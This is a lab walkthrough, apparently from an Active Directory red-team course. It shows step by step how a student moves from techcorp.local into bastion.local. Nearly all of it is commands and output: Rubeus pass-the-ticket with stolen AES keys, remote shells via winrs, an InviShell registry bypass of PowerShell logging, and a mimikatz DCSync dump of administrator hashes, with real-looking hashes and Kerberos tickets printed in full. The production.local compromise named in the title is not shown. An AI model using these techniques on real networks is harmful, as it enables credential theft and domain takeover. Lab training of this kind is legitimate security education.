# Hands-On 28:

```
Compromise production.local by abusing PAM trust between bastion.local and production.local
```
## Index of Content

  1.[Compromise production local](#compromise-production-local)
  
## Compromise production local

Enumeration of Privileges that could belong to DA of Administrator user of techcorp.local because the bastion.local it's a trust domain:

```
PS C:\Users\studentuser17> Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local | select -ExpandProperty Distinguishedname
CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
CN=S-1-5-21-2781415573-3701854478-2406986946-500,CN=ForeignSecurityPrincipals,DC=bastion,DC=local
```

```
PS C:\Users\studentuser17> Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}


DistinguishedName : CN=Administrators,CN=Builtin,DC=bastion,DC=local
GroupCategory     : Security
GroupScope        : DomainLocal
Member            : {CN=S-1-5-21-2781415573-3701854478-2406986946-500,CN=ForeignSecurityPrincipals,DC=bastion,DC=local,
                     CN=Domain Admins,CN=Users,DC=bastion,DC=local, CN=Enterprise Admins,CN=Users,DC=bastion,DC=local,
                    CN=Administrator,CN=Users,DC=bastion,DC=local}
Name              : Administrators
ObjectClass       : group
ObjectGUID        : 788f92b1-3806-4eef-bcaa-dd8111f45aa5
SamAccountName    : Administrators
SID               : S-1-5-32-544
```

Spawn a shell with Administrator user of techcorp.local tgt using rubeus from a high elevated privileges cmd console:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Showing process : True
[*] Username        : 8RQPLJ8M
[*] Domain          : HKSFAX5Q
[*] Password        : V1FIX1KZ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3564
[+] LUID            : 0xc00969a

[*] Using aes256_cts_hmac_sha1 hash: 58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
[*] Building AS-REQ (w/ preauth) for: 'techcorp.local\administrator'
[*] Target LUID : 201365146
[*] Using domain controller: 192.168.1.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[*] Target LUID: 0xc00969a
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/techcorp.local
  ServiceRealm             :  TECHCORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  TECHCORP.LOCAL
  StartTime                :  3/4/2023 12:46:51 PM
  EndTime                  :  3/4/2023 10:46:51 PM
  RenewTill                :  3/11/2023 12:46:51 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  rMisVsVN/5Up5RcKFjuHZpRpOH9ucODoZcS3b8fEy2M=
  ASREP (key)              :  58DB3C598315BF030D4F1F07021D364BA9350444E3F391E167938DD998836883
```
From the new terminal tray to authenticate the Adminsitor of the tchcorp.local:
```
C:\Windows\system32>winrs -r:bastion-dc.bastion.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.TECHCORP>hostname
hostname
Bastion-DC

C:\Users\Administrator.TECHCORP>whoami
whoami
techcorp\administrator

C:\Users\Administrator.TECHCORP>

```
Cupy and run invishell:
```
C:\Users\Public\RunWithRegistryNonAdmin.bat

C:\Users\Public>set COR_ENABLE_PROFILING=1

C:\Users\Public>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\InShellProf.dll" /f
The operation completed successfully.

C:\Users\Public>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

CHeck PAM Trust:

```
PS C:\Users\Public> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}


Direction               : Outbound
DisallowTransivity      : False
DistinguishedName       : CN=techcorp.local,CN=System,DC=bastion,DC=local
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : techcorp.local
ObjectClass             : trustedDomain
ObjectGUID              : 05498dce-bdab-4a88-946d-077d5dd0da16
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=bastion,DC=local
Target                  : techcorp.local
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : Inbound
DisallowTransivity      : False
DistinguishedName       : CN=production.local,CN=System,DC=bastion,DC=local
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : production.local
ObjectClass             : trustedDomain
ObjectGUID              : 3e0958ef-54c4-4afe-b4df-672150c1dbfc
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=bastion,DC=local
Target                  : production.local
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```
Use the permissions on the same terminal of adminstrator to dump lsa creds of bstion-dc:

```
exit
exit
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:bastion\Administrator /domain:bastion.local" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:bastion\Administrator /domain:bastion.local
[DC] 'bastion.local' will be the domain
[DC] 'Bastion-DC.bastion.local' will be the DC server
[DC] 'bastion\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 7/12/2019 9:49:56 PM
Object Security ID   : S-1-5-21-284138346-1733301406-1958478260-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f29207796c9e6829aa1882b7cccfa36d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 31b615437127e4a4badbea412c32e37f

* Primary:Kerberos-Newer-Keys *
    Default Salt : BASTION-DCAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
      aes128_hmac       (4096) : e8679f4d4ed30fe9d2aeabb8b5e5398e
      des_cbc_md5       (4096) : 869b5101a43d73f2
    OldCredentials
      aes256_hmac       (4096) : cf6744ea466302f40e4e56d056ebc647e57c8a89ab0bc6a747c51945bdcba381
      aes128_hmac       (4096) : 709452c5ffe4e274fc731903a63c9148
      des_cbc_md5       (4096) : 29ef1ce323bac8a8
    OlderCredentials
      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
      des_cbc_md5       (4096) : 31435d975783d0d0

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BASTION-DCAdministrator
    Credentials
      des_cbc_md5       : 869b5101a43d73f2
    OldCredentials
      des_cbc_md5       : 29ef1ce323bac8a8


mimikatz(commandline) # exit
Bye!
```

Using Rubeus to create a new TGT  for administrator user of bastion.local:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Showing process : True
[*] Username        : CJRQ1PBV
[*] Domain          : 2T3F8QTS
[*] Password        : CDP86QGS
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4308
[+] LUID            : 0xc045a13

[*] Using aes256_cts_hmac_sha1 hash: a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
[*] Building AS-REQ (w/ preauth) for: 'bastion.local\administrator'
[*] Target LUID : 201611795
[*] Using domain controller: 192.168.101.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      DWJhc3Rpb24ubG9jYWw=
[*] Target LUID: 0xc045a13
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/bastion.local
  ServiceRealm             :  BASTION.LOCAL
  UserName                 :  administrator
  UserRealm                :  BASTION.LOCAL
  StartTime                :  3/4/2023 12:59:32 PM
  EndTime                  :  3/4/2023 10:59:32 PM
  RenewTill                :  3/11/2023 12:59:32 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  FzbMGCvjJNESjjzqHwBgduEeBRWbhvTB9VF0u0rEhek=
  ASREP (key)              :  A32D8D07A45E115FA499CF58A2D98EF5BF49717AF58BC4961C94C3C95FC03292
```
Validation:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>winrs -r:bastion-dc.bastion.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
Bastion-DC

C:\Users\Administrator>whoami
whoami
bastion\administrator

C:\Users\Administrator>

```
